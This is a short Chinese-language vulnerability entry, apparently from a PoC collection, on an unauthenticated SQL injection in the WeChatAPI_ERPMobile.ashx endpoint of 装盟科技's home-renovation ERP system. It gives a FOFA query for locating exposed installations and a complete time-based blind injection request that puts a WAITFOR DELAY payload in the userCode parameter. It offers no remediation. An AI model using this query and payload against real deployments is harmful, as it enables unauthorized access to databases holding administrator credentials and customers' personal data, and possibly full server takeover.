# 装盟科技 家装ERP管理系统 WeChatAPI_ERPMobile.ashx SQL注入漏洞

# 一、漏洞简介
装盟科技 家装ERP管理系统 WeChatAPI_ERPMobile.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。


## fofa

```yaml
app="装盟科技-家装ERP管理系统"
```

## poc

```java
GET /WEB_SERVICE/WeChatAPI_ERPMobile.ashx?type=LoginIndex&userCode=1';WAITFOR+DELAY+'0:0:5'-- -&password=1 HTTP/1.1
Host: [目标主机地址]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```